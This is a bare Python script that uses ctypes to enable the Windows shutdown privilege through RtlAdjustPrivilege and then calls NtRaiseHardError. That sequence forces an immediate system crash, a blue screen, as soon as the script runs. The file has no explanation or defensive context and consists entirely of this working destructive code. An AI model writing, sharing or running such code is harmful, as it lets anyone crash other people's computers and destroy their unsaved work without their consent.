import ctypes
def RtlAdjustPrivilege(Privilege, bEnablePrivilege, IsThreadPrivilege):
    ntdll = ctypes.WinDLL('ntdll')
    RtlAdjustPrivilege = ntdll.RtlAdjustPrivilege
    RtlAdjustPrivilege.argtypes = [ctypes.c_int, ctypes.c_bool, ctypes.c_bool, ctypes.POINTER(ctypes.c_bool)]
    RtlAdjustPrivilege.restype = ctypes.c_uint
    PreviousValue = ctypes.c_bool()
    result = RtlAdjustPrivilege(Privilege, bEnablePrivilege, IsThreadPrivilege, ctypes.byref(PreviousValue))
    return result, PreviousValue.value
def NtRaiseHardError(ErrorStatus, NumberOfParameters, UnicodeStringParameterMask, Parameters, ValidResponseOption):
    ntdll = ctypes.WinDLL('ntdll')
    NtRaiseHardError = ntdll.NtRaiseHardError
    NtRaiseHardError.argtypes = [ctypes.c_uint, ctypes.c_uint, ctypes.c_uint, ctypes.c_void_p, ctypes.c_uint, ctypes.POINTER(ctypes.c_uint)]
    NtRaiseHardError.restype = ctypes.c_uint
    Response = ctypes.c_uint()
    result = NtRaiseHardError(ErrorStatus, NumberOfParameters, UnicodeStringParameterMask, Parameters, ValidResponseOption, ctypes.byref(Response))
    return result, Response.value
def main():
    t1 = ctypes.c_bool()
    t2 = ctypes.c_uint()
    RtlAdjustPrivilege(19, True, False)
    NtRaiseHardError(0xc0000022, 0, 0, None, 6)
main()
